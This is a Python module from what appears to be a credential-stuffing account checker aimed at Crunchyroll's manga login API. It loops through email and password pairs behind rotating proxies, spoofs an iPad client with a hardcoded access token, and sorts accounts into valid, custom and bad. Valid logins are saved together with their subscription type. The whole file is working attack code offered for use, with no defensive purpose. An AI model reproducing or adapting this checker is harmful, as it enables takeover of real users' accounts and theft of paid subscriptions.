from modules.variables import Checker
from requests import post
from modules.functions import log,save,set_proxy,bad_proxy

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        header = {
            "Host": "api-manga.crunchyroll.com" ,
            "Content-Type": "application/x-www-form-urlencoded" ,
            "Accept": "*/*" ,
            "Connection": "keep-alive" ,
            "User-Agent": "Manga/4.2.0 (iPad; iOS 14.4; Scale/2.00)" ,
            "Accept-Language": "nl-NL;q=1, ar-NL;q=0.9" ,
            "Accept-Encoding": "gzip, deflate, br" ,
        }
        data = f"access_token=dcIhv87VpKsqLCZ&account={email}&api_ver=1.0&device_id=123-456-789&device_type=com.crunchyroll.manga.ipad&duration=6000&format=json&password={password}"
        try:
            r = post("https://api-manga.crunchyroll.com/cr_login",headers=header,data=data,proxies=proxy_set,timeout=Checker.timeout)
            if "Incorrect login information" in r.text:
                retries += 1
            elif "\"premium\":\"\"" in r.text:
                if not Checker.cui:
                    log("custom",email+":"+password,"Crunchyroll")
                save("Crunchyroll","custom",Checker.time,email+":"+password)
                Checker.custom += 1
                Checker.cpm += 1
                return
            elif "\"user_id\"" in r.text:
                subscription = r.json()["data"]["user"]["access_type"]
                if not Checker.cui:
                    log("good",email+":"+password,"Crunchyroll")
                save("Crunchyroll","good",Checker.time,email+":"+password+f" | Subscription: {subscription}")
                Checker.good += 1
                Checker.cpm += 1
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return